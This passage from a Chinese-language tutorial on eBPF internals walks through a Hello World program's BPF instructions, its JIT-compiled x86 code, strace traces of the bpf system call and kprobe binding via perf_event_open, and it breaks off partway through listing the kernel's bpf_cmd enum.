指令码。它的具体含义你可以参考 IOVisor BPF 文档，比如第 0 行的 0xb7 表示为 64 位寄存器赋值。</li><li>第三部分，括号后面的部分，就是 BPF 指令的伪代码。</li></ul><p>结合前面讲述的各个寄存器的作用，不难理解这些 BPF 指令的含义：</p><ul><li>第 0-8 行，借助 R10 寄存器从栈中把字符串 “Hello, World!” 读出来，并放入 R1 寄存器中；</li><li>第 9 行，向 R2 寄存器写入字符串的长度 14（即代码注释里面的  <code>sizeof(_fmt)</code> ）；</li><li>第 10 行，调用 BPF 辅助函数  <code>bpf_trace_printk</code>  输出字符串；</li><li>第 11 行，向 R0 寄存器写入 0，表示程序的返回值是 0；</li><li>最后一行，程序执行成功退出。</li></ul><p>总结起来，<strong>这些指令先通过 R1 和 R2 寄存器设置了 <code>bpf_trace_printk</code> 的参数，然后调用 <code>bpf_trace_printk</code> 函数输出字符串，最后再通过 R0 寄存器返回成功</strong>。</p><p>实际上我们也可以通过类似的 BPF 指令来开发 eBPF 程序，不过相对于一开始的 C 程序相比，BPF 指令的可读性和维护性明显差得多。所以还是建议使用 C 语言开发 eBPF 程序，而只把 BPF 指令作为排查 eBPF 程序疑难杂症时的参考。</p><p>这里，来简单看看  BPF 指令加载后是如何运行的。当这些 BPF 指令加载到内核后， BPF 即时编译器会将其编译成本地机器指令，最后才会执行编译后的机器指令：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">bpftool</span> <span class="token expression">prog dump jited id <span class="token number">580</span></span></span><span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> ctx<span class="token punctuation">)</span><span class="token operator">:</span>bpf_prog_38dd440716c4900f_hello_world<span class="token operator">:</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span>   <span class="token number">0</span><span class="token operator">:</span>  nopl   <span class="token number">0x0</span><span class="token punctuation">(</span><span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token operator">%</span>rax<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token number">5</span><span class="token operator">:</span>  xchg   <span class="token operator">%</span>ax<span class="token punctuation">,</span><span class="token operator">%</span>ax   <span class="token number">7</span><span class="token operator">:</span>  push   <span class="token operator">%</span>rbp   <span class="token number">8</span><span class="token operator">:</span>  mov    <span class="token operator">%</span>rsp<span class="token punctuation">,</span><span class="token operator">%</span>rbp   b<span class="token operator">:</span>  sub    $<span class="token number">0x10</span><span class="token punctuation">,</span><span class="token operator">%</span>rsp  <span class="token number">12</span><span class="token operator">:</span>  mov    $<span class="token number">0x21</span><span class="token punctuation">,</span><span class="token operator">%</span>edi<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token keyword">char</span> _fmt<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">;</span> <span class="token function">bpf_trace_printk_</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token number">17</span><span class="token operator">:</span>  mov    <span class="token operator">%</span>di<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">(</span><span class="token operator">%</span>rbp<span class="token punctuation">)</span>  <span class="token number">1</span>b<span class="token operator">:</span>  mov    $<span class="token number">0x646c726f</span><span class="token punctuation">,</span><span class="token operator">%</span>edi  <span class="token number">20</span><span class="token operator">:</span>  mov    <span class="token operator">%</span>edi<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">(</span><span class="token operator">%</span>rbp<span class="token punctuation">)</span>  <span class="token number">23</span><span class="token operator">:</span>  movabs $<span class="token number">0x57202c6f6c6c6548</span><span class="token punctuation">,</span><span class="token operator">%</span>rdi  <span class="token number">2</span>d<span class="token operator">:</span>  mov    <span class="token operator">%</span>rdi<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">(</span><span class="token operator">%</span>rbp<span class="token punctuation">)</span>  <span class="token number">31</span><span class="token operator">:</span>  mov    <span class="token operator">%</span>rbp<span class="token punctuation">,</span><span class="token operator">%</span>rdi<span class="token punctuation">;</span>  <span class="token number">34</span><span class="token operator">:</span>  add    $<span class="token number">0xfffffffffffffff0</span><span class="token punctuation">,</span><span class="token operator">%</span>rdi<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token keyword">char</span> _fmt<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">;</span> <span class="token function">bpf_trace_printk_</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>_fmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token number">38</span><span class="token operator">:</span>  mov    $<span class="token number">0xe</span><span class="token punctuation">,</span><span class="token operator">%</span>esi  <span class="token number">3</span>d<span class="token operator">:</span>  call   <span class="token number">0xffffffffd8c7e834</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token number">42</span><span class="token operator">:</span>  xor    <span class="token operator">%</span>eax<span class="token punctuation">,</span><span class="token operator">%</span>eax  <span class="token number">44</span><span class="token operator">:</span>  leave  <span class="token number">45</span><span class="token operator">:</span>  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些机器指令的含义跟前面的 BPF 指令是类似的，但具体的指令和寄存器都换成了 x86 的格式。你不需要掌握这些机器指令的具体含义，只要知道查询的具体方法就足够了。这是因为，就像你曾接触过的其他高级语言一样，在实际的 eBPF 使用过程中，并不需要直接使用机器指令，而是 eBPF 虚拟机帮你自动完成了转换。</p><h3 id="eBPF-程序是什么时候执行的"><a href="#eBPF-程序是什么时候执行的" class="headerlink" title="eBPF 程序是什么时候执行的"></a>eBPF 程序是什么时候执行的</h3><p>到这里，我想你已经理解了 BPF 指令的具体格式，以及它与  C 源代码之间的对应关系。不过，这个 eBPF 程序到底是什么时候执行的呢？接下来，我们再一起看看 BPF 指令的加载和执行过程。</p><p>在上一讲中我提到，BCC 负责了 eBPF 程序的编译和加载过程。因而，要了解 BPF 指令的加载过程，就可以从 BCC 执行 eBPF 程序的过程入手。</p><p>那么，怎么才能查看到 BCC 的执行过程呢？那就是跟踪它的系统调用过程。首先，我们打开一个终端，执行下面的命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># -ebpf表示只跟踪bpf系统调用</span><span class="token function">sudo</span> <span class="token function">strace</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-f</span> <span class="token parameter variable">-ebpf</span> python3 ./hello.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">bpf</span><span class="token punctuation">(</span>BPF_BTF_LOAD<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>btf <span class="token operator">=</span> <span class="token string">"\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\340\10\0\0\0\0\0\0\0\0\0\2"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>btf_log_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>btf_size <span class="token operator">=</span> <span class="token number">2960</span><span class="token punctuation">,</span>btf_log_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>btf_log_level <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token function">bpf</span><span class="token punctuation">(</span>BPF_PROG_LOAD<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>prog_type <span class="token operator">=</span> BPF_PROG_TYPE_KPROBE<span class="token punctuation">,</span>insn_cnt <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">,</span>insns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_ALU64 <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_MOV<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_STX <span class="token operator">|</span> BPF_H <span class="token operator">|</span> BPF_MEM<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_10<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_ALU64 <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_MOV<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0x646c726f</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_STX <span class="token operator">|</span> BPF_W <span class="token operator">|</span> BPF_MEM<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_10<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_LD <span class="token operator">|</span> BPF_DW <span class="token operator">|</span> BPF_IMM<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0x6c6c6548</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_LD <span class="token operator">|</span> BPF_W <span class="token operator">|</span> BPF_IMM<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0x57202c6f</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_STX <span class="token operator">|</span> BPF_DW <span class="token operator">|</span> BPF_MEM<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_10<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_ALU64 <span class="token operator">|</span> BPF_X <span class="token operator">|</span> BPF_MOV<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_10<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_ALU64 <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_ADD<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_1<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0xfffffff0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_ALU64 <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_MOV<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_2<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0xe</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_JMP <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_CALL<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0x6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_ALU64 <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_MOV<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>code <span class="token operator">=</span> BPF_JMP <span class="token operator">|</span> BPF_K <span class="token operator">|</span> BPF_EXIT<span class="token punctuation">,</span>dst_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>src_reg <span class="token operator">=</span> BPF_REG_0<span class="token punctuation">,</span>off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>imm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>license <span class="token operator">=</span> <span class="token string">"GPL"</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>log_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>log_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>kern_version <span class="token operator">=</span> <span class="token function">KERNEL_VERSION</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span>prog_flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>prog_name <span class="token operator">=</span> <span class="token string">"hello_world"</span><span class="token punctuation">,</span>prog_ifindex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>expected_attach_type <span class="token operator">=</span> BPF_CGROUP_INET_INGRESS<span class="token punctuation">,</span>prog_btf_fd <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>func_info_rec_size <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">,</span>func_info <span class="token operator">=</span> <span class="token number">0x1ad3af0</span><span class="token punctuation">,</span>func_info_cnt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>line_info_rec_size <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">,</span>line_info <span class="token operator">=</span> <span class="token number">0x1ac4690</span><span class="token punctuation">,</span>line_info_cnt <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span>attach_btf_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>attach_prog_fd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/straceHelloPY.png" class=""><p>这些参数看起来很复杂，但实际上，如果你查询 bpf 系统调用的格式（执行 man bpf 命令），就可以发现，它实际上只需要三个参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">int bpf<span class="token punctuation">(</span>int cmd, union bpf_attr *attr, unsigned int size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应前面的 strace 输出结果，这三个参数的具体含义如下。</p><ul><li>第一个参数是 BPF_PROG_LOAD ， 表示加载 BPF 程序。</li><li>第二个参数是 bpf_attr 类型的结构体，表示 BPF 程序的属性。其中，有几个需要你留意的参数，比如：<ul><li><code>prog_type</code> 表示 BPF 程序的类型，这儿是 <code>BPF_PROG_TYPE_KPROBE</code> ，跟我们 Python 代码中的 <code>attach_kprobe</code> 一致；</li><li><code>insn_cnt (instructions count)</code> 表示指令条数；insns (instructions) 包含了具体的每一条指令，这儿的 13 条指令跟我们前面 <code>bpftool prog dump</code> 的结果是一致的（具体的指令格式，你可以参考内核中 bpf_insn 的定义）；</li><li><code>prog_name</code> 则表示 BPF 程序的名字，即 <code>hello_world</code> 。</li></ul></li><li>第三个参数 120 表示属性的大小。</li></ul><p>到这里，我们已经了解了 bpf 系统调用的基本格式。对于  bpf  系统调用在内核中的实现原理，你并不需要详细了解。我们只要知道它的具体功能，就可以掌握 eBPF 的核心原理了。当然，如果你对它的实现方法有兴趣的话，可以参考内核源码 <code>kernel/bpf/syscall.c</code> 中<code> SYSCALL_DEFINE3</code> 的实现。</p><p>BPF 程序加载到内核后，并不会立刻执行，而是基于它的基本原理来的</p><blockquote><p>eBPF 程序并不像常规的线程那样，启动后就一直运行在那里，它需要事件触发后才会执行。这些事件包括系统调用、内核跟踪点、内核函数和用户态函数的调用退出、网络事件，等等。</p></blockquote><p>对于我们的 Hello World 来说，由于调用了 <code>attach_kprobe</code> 函数，很明显，这是一个内核跟踪事件：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">b<span class="token punctuation">.</span><span class="token function">attach_kprobe</span><span class="token punctuation">(</span>event<span class="token operator">=</span><span class="token string">"do_sys_openat2"</span><span class="token punctuation">,</span> fn_name<span class="token operator">=</span><span class="token string">"hello_world"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以，除了把 eBPF 程序加载到内核之外，还需要把加载后的程序跟具体的内核函数调用事件进行绑定。在 eBPF 的实现中，诸如内核跟踪（kprobe）、用户跟踪（uprobe）等的事件绑定，都是通过  <code>perf_event_open()</code>  来完成的。</p><p>为什么这么说呢？我们再用  <code>strace</code>  来确认一下。把前面  <code>strace</code>  命令中的  <code>-ebpf</code>  参数去掉，重新执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">strace</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-f</span> python3 ./hello.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>忽略无关的输出后，会发现如下的系统调用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>./* <span class="token number">1</span><span class="token punctuation">)</span> 加载BPF程序 */bpf<span class="token punctuation">(</span>BPF_PROG_LOAD,<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">..</span>./* <span class="token number">2</span>）查询事件类型 */openat<span class="token punctuation">(</span>AT_FDCWD, <span class="token string">"/sys/bus/event_source/devices/kprobe/type"</span>, O_RDONLY<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span>read<span class="token punctuation">(</span><span class="token number">5</span>, <span class="token string">"6<span class="token entity" title="\n">\n</span>"</span>, <span class="token number">4096</span><span class="token punctuation">)</span>                    <span class="token operator">=</span> <span class="token number">2</span>close<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                                <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">..</span>./* <span class="token number">3</span>）创建性能监控事件 */perf_event_open<span class="token punctuation">(</span>    <span class="token punctuation">&#123;</span>        <span class="token assign-left variable">type</span><span class="token operator">=</span>0x6 /* PERF_TYPE_??? */,        <span class="token assign-left variable">size</span><span class="token operator">=</span>PERF_ATTR_SIZE_VER7,        <span class="token punctuation">..</span>.        <span class="token assign-left variable">wakeup_events</span><span class="token operator">=</span><span class="token number">1</span>,        <span class="token assign-left variable">config1</span><span class="token operator">=</span>0x7f275d195c50,        <span class="token punctuation">..</span>.    <span class="token punctuation">&#125;</span>,    -1,    <span class="token number">0</span>,    -1,    PERF_FLAG_FD_CLOEXEC<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span>/* <span class="token number">4</span>）绑定 BPF 到 kprobe 事件 */ioctl<span class="token punctuation">(</span><span class="token number">5</span>, PERF_EVENT_IOC_SET_BPF, <span class="token number">4</span><span class="token punctuation">)</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从输出中，我们可以看出 BPF 与性能事件的绑定过程分为以下几步：</p><ul><li>首先，借助 bpf 系统调用，加载 BPF 程序，并记住返回的文件描述符；</li><li>然后，查询 kprobe 类型的事件编号。BCC 实际上是通过  <code>/sys/bus/event_source/devices/kprobe/type</code> 来查询的；</li><li>接着，调用  <code>perf_event_open</code>  创建性能监控事件。比如，事件类型（type 是上一步查询到的 6）、事件的参数（ config1 包含了内核函数 <code>do_sys_openat2</code> ）等；</li><li>最后，再通过 <code>ioctl</code> 的 <code>PERF_EVENT_IOC_SET_BPF</code> 命令，将 BPF 程序绑定到性能监控事件。</li></ul><h3 id="小结-eBPF-虚拟机工作原理"><a href="#小结-eBPF-虚拟机工作原理" class="headerlink" title="小结 eBPF 虚拟机工作原理"></a>小结 eBPF 虚拟机工作原理</h3><p>梳理 eBPF 在内核中的实现原理，并以上一讲的 Hello World 程序为例，借助 bpftool、strace 等工具，观察了 BPF 指令的具体格式。</p><p>然后，我们从 BCC 执行 eBPF 程序的过程入手，一起看了 BPF 指令的加载和执行过程。用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码（即 BPF 指令），然后借助  bpf  系统调用加载到内核中，最后再通过性能监控等接口，与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。</p><h2 id="eBPF-程序是怎么跟内核进行交互的"><a href="#eBPF-程序是怎么跟内核进行交互的" class="headerlink" title="eBPF 程序是怎么跟内核进行交互的"></a>eBPF 程序是怎么跟内核进行交互的</h2><p>eBPF 程序到底是如何跟内核事件进行绑定的？又该如何跟内核中的其他模块进行交互呢？今天，一起看看 eBPF 程序的编程接口。</p><p>如下图（图片来自 brendangregg.com）所示，一个完整的 eBPF 程序通常包含用户态和内核态两部分。其中，用户态负责 eBPF 程序的加载、事件绑定以及 eBPF 程序运行结果的汇总输出；内核态运行在 eBPF 虚拟机中，负责定制和控制系统的运行状态。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/CompleteProgram.png" class=""><p>对于用户态程序来说，我想你已经了解，<strong>它们与内核进行交互时必须要通过系统调用来完成</strong>。而对应到 eBPF 程序中，我们最常用到的就是 <a class="link"   href="https://man7.org/linux/man-pages/man2/bpf.2.html" >bpf 系统调用<i class="fas fa-external-link-alt"></i></a>。</p><p>在命令行中输入 man bpf ，就可以查询到 BPF 系统调用的调用格式（虽然前面已经看过了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/bpf.h></span></span><span class="token keyword">int</span> <span class="token function">bpf</span><span class="token punctuation">(</span><span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">union</span> bpf_attr <span class="token operator">*</span>attr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>BPF 系统调用接受三个参数：</p><ul><li>第一个，cmd ，代表操作命令，比如上一讲中我们看到的 <code>BPF_PROG_LOAD</code> 就是加载 eBPF 程序；</li><li>第二个，attr，代表 <code>bpf_attr</code> 类型的 eBPF 属性指针，不同类型的操作命令需要传入不同的属性参数；</li><li>第三个，size ，代表属性的大小。</li></ul><p>注意，不同版本的内核所支持的 BPF 命令是不同的，具体支持的命令列表可以参考内核头文件 <code>include/uapi/linux/bpf.h</code> 中  <code>bpf_cmd</code> 的定义。比如，v5.13 内核已经支持 36 个 BPF 命令：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token class-name">bpf_cmd</span> <span class="token punctuation">&#123;</span>  BPF_MAP_CREATE<span class="token punctuation">,</span>  BPF_MAP_LOOKUP_ELEM<span class="token punctuation">,</span>  BPF_MAP_UPDATE_ELEM<span class="token punctuation">,</span>  BPF_MAP_DELETE_ELEM<span class="token punctuation">,</span>  BPF_MAP_GET_NEXT_KEY<span class="token punctuation">,</span>  BPF_PROG_LOAD<span class="token punctuation">,</span>  BPF_OBJ_PIN<span class="token punctuation">,</span>  BPF_OBJ_GET<span class="token punctuation">,</span>  BPF_PROG_ATTACH<span class="token punctuation">,</span>  BPF_PROG_DETACH<span class="token punctuation">,</span>  BPF_PROG_TEST_RUN<span class="token punctuation">,</span>  BPF_PROG_GET_NEXT_ID<span class="token punctuation">,</span>  BPF_MAP_GET_NEXT_ID<span class="token punctuation">,</span>  BPF_PROG_GET_FD_BY_ID<span class="token punctuation">,</span>  BPF_MAP_GET_FD_BY_ID<span class="token punctuation">,</span>  BPF_OBJ_GET_INFO_BY_FD<span class="token punctuation">,</span>  BPF_PROG_QUERY<span class="token punctuation">,</span>  BPF_RAW_TRACEPOINT_OPEN<span class="token punctuation">,</span>  BPF_BTF_LOAD<span class="token punctuation">,</span>  BPF_BTF_GET_FD_BY_ID<span class="token punctuation">,</span>  BPF_TASK_FD_QUERY<span class="token punctuation">,</span>  BPF_MAP_LOOKUP_AND_DELETE_ELEM<span class="token punctuation">,</span>  BPF_MAP_FREEZE<span class="token punctuation">,</span>  BPF_BTF_GET_NEXT_ID<span class="token punctuation">,</span>  BPF_MAP_LOOKUP_BATCH<span class="token punctuation">,</span>  BPF_MAP_LOOKUP_AND_DELETE_BATCH<span class="token punctuation">,</span>  BPF_MAP_UPDATE_BATCH<span class="token punctuation">,</span>  BPF_MAP_DELETE_BATCH<span class="token punctuation">,</span>  BPF_LINK_CREATE<span class="token punctuation">,</span>  BPF_LINK_UPDATE<span class="token punctuation">,</span>  BPF_LINK_GET_FD_BY_ID<span class="token punctuation">,</span>  BPF_LINK_GET_NEXT_ID<span class="token punctuation">,</span>  BPF_ENABLE_STATS<span class="token punctuation">,</span>  BPF_ITER_CREATE<span class="token punctuation">,</span>  